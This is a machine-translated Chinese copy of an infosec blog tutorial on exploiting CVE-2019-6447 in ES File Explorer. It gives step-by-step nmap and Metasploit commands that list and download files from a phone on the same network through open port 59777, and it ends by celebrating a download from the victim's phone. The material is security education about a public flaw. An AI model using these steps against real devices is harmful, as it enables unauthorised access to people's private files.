<html>
<head>
<title>ES File Explorer Open Port Vulnerability exploitation</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ES文件浏览器开放端口漏洞利用</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/es-file-explorer-open-port-vulnerability-exploitation-a41b328c2d2c?source=collection_archive---------1-----------------------#2022-08-07">https://infosecwriteups.com/es-file-explorer-open-port-vulnerability-exploitation-a41b328c2d2c?source=collection_archive---------1-----------------------#2022-08-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/d1dcdacb7a04b8e7eaffec4610569eea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*H8DMybusfGZKop7i.jpg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图像<a class="ae kc" href="https://null-byte.wonderhowto.com/how-to/android-for-hackers-scan-websites-for-vulnerabilities-using-android-phone-without-root-0190105/" rel="noopener ugc nofollow" target="_blank">来源</a></figcaption></figure><p id="50e6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ES文件浏览器(文件管理器)是一个全功能的文件(图像，音乐，电影，文档，应用程序)管理器，既可以本地使用，也可以联网使用！ES File Explorer(文件管理器)在全球拥有超过5亿用户，可帮助您高效管理您的android手机和文件，并在没有数据成本的情况下共享文件。</p><p id="1dc9" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">2019年1月，一名安全研究人员在ES文件浏览器中发布了一个安全漏洞(CVE-2019–6447)。</p><p id="6f34" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这适用于版本4.1.9.7.4。允许同一网络上的攻击者执行应用程序、读取文件和敏感的个人数据。该应用程序在运行时保持TCP端口59777打开，并通过http响应假冒请求。</p><p id="35c6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">要执行此攻击，您需要:</strong></p><ol class=""><li id="1995" class="lb lc iq kf b kg kh kk kl ko ld ks le kw lf la lg lh li lj bi translated"><em class="lk"> Kali Linux或任何Linux发行版</em></li><li id="5091" class="lb lc iq kf b kg ll kk lm ko ln ks lo kw lp la lg lh li lj bi translated"><em class="lk"> Msfconsole </em></li><li id="cf77" class="lb lc iq kf b kg ll kk lm ko ln ks lo kw lp la lg lh li lj bi translated"><em class="lk">目标手机应已安装ES文件浏览器版本4.1.9.7.4 </em></li><li id="75af" class="lb lc iq kf b kg ll kk lm ko ln ks lo kw lp la lg lh li lj bi translated"><em class="lk">攻击者和受害者应该在同一个网络上</em></li><li id="845c" class="lb lc iq kf b kg ll kk lm ko ln ks lo kw lp la lg lh li lj bi translated"><em class="lk">应用程序也必须运行，以便端口59777保持打开</em></li></ol><p id="3474" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">每次用户启动应用程序时，都会启动一个HTTP服务器。该服务器正在本地打开端口59777:</p><p id="ce82" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">您可以nmap到目标并查看端口是否打开；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="d74b" class="lz ma iq lv b gy mb mc l md me">nmap -p 59777 192.168.1.1</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi mf"><img src="../Images/59fd0fb1bd1504a02bcb0968a2874b6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:438/format:webp/1*DbcJYQG2RlIuO-_U1NhqZw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图1</figcaption></figure><p id="6210" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你找不到你的IP地址，请看上图。</p><p id="e856" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">启动metasploit框架；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="f95e" class="lz ma iq lv b gy mb mc l md me">msfconsole</span></pre><p id="37e2" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">搜索es_file漏洞利用；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="5c6a" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; search es_file</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mg"><img src="../Images/0c5701496a53ccb9e6c6402bfa92bca0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xbYgCqAbkRSr0-DTleJhfw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图2</figcaption></figure><p id="d07b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">选择漏洞利用模块；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="5322" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; use auxiliary/scanner/http/es_file_explorer_open_port</span></pre><p id="d9a2" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">显示选项以检查可用选项；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="e4cb" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; show options</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mh"><img src="../Images/8b9bcd6ea70734d0601457b37b8d2fdb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FSQFfzPR2Cxak0J_p_yOfQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图3</figcaption></figure><p id="70c8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">您看到远程主机(RHOSTS)没有指定，所以将RHOSTS设置为您的目标手机的IP地址；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="4acc" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; set RHOSTS 192.168.1.1</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mi"><img src="../Images/dea6aa72efdb8afcdb28a577d39ebbf6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ytHIpZLmLJbA124Mio5eig.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图4</figcaption></figure><p id="bf5f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在运行漏洞利用；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="3a9b" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; run</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mj"><img src="../Images/189f567509bbe0aefd9dce1f216f22bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TyaFbMchHtg0TiYPlohw4g.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图5</figcaption></figure><p id="a3d1" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">您可以查看手机的详细信息。</p><p id="4f0d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">显示操作以列出所有可用的操作；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="4fa1" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; show actions</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mk"><img src="../Images/d72bb87edbaf550aab08ce43a9ae1a48.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T2tPKmNL_bv1M_xnKdTHXQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图6</figcaption></figure><p id="3d69" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">将动作设置为列出您想要的任何内容，在本例中，我将它设置为“LISTVIDEOS”</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="73e0" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; set action LISTVIDEOS</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ml"><img src="../Images/cc339ca82cfb9bc435a6ab8a55f84c03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*p5TarTdPzjsgPV2E5E6AaQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图7</figcaption></figure><p id="adef" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在我们都准备好了，给运行命令；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="a2a6" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; run</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mm"><img src="../Images/854545c3edc208f118a424561bf5d880.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GQkTIdwS0uymYta9kC4qqQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图8</figcaption></figure><p id="163c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">你可以看到我手机上列出的所有音频文件。</p><p id="89ea" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你愿意，我们可以下载任何文件。</p><p id="d9aa" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">您需要将操作设置为GETFILE</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="590c" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; set action GETFILE</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mn"><img src="../Images/4f3adffd7aa26168c8beaac85210edbd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o73sADMsrUDVS0_9omPR3g.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图9</figcaption></figure><p id="9d2a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">并将ACTIONITEM设置为文件名，其中包含您要从上一步中找到的可用列表中下载的路径；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="8c64" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; set ACTIONITEM /pathto/123.mp3</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mo"><img src="../Images/062782794de7e7309828a3eccdd0e757.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IlWRJf4wL8YqUmWKbQqoDA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图10</figcaption></figure><p id="fbb6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在运行漏洞利用；</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="61d0" class="lz ma iq lv b gy mb mc l md me">msf6 &gt; run</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mp"><img src="../Images/02a9b654cda56fe5bdc5a618bbd1fb80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uETyzMEI-e5DpN1HJLPl_w.png"/></div></div></figure><p id="bd96" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">就这样，现在你已经成功地从受害者的手机上下载了一个文件！！！。</p></div><div class="ab cl mq mr hu ms" role="separator"><span class="mt bw bk mu mv mw"/><span class="mt bw bk mu mv mw"/><span class="mt bw bk mu mv"/></div><div class="ij ik il im in"><p id="3958" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">观看此视频，了解分步指南；</p><figure class="lq lr ls lt gt jr"><div class="bz fp l di"><div class="mx my l"/></div></figure><p id="a081" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你喜欢这篇文章，请给我一两个掌声。</p></div><div class="ab cl mq mr hu ms" role="separator"><span class="mt bw bk mu mv mw"/><span class="mt bw bk mu mv mw"/><span class="mt bw bk mu mv"/></div><div class="ij ik il im in"><p id="a60e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="lk">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。</em> <a class="ae kc" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="kf ir"> <em class="lk">加入我们的每周简讯</em> </strong> </a> <em class="lk">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>